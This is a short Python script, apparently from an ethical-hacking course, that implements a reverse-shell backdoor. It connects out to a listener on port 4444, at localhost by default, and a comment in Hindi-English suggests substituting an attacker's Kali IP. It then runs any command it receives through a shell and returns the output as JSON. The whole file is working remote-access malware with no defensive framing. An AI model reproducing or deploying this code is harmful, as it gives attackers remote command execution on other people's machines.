import socket
import subprocess
import json

def execute_system_command(command):
    try:
        # Command output ko decode karke string banana zaroori hai JSON ke liye
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception:
        return "[-] Error during command execution."

def reliable_send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode())

def reliable_receive():
    json_data = b""
    while True:
        try:
            json_data = json_data + connection.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Testing ke liye 127.0.0.1 (Apni Kali ki IP bhi daal sakte ho)
connection.connect(("127.0.0.1", 4444)) 

while True:
    command = reliable_receive()
    if command[0] == "exit":
        connection.close()
        exit()
    
    command_result = execute_system_command(command)
    reliable_send(command_result)
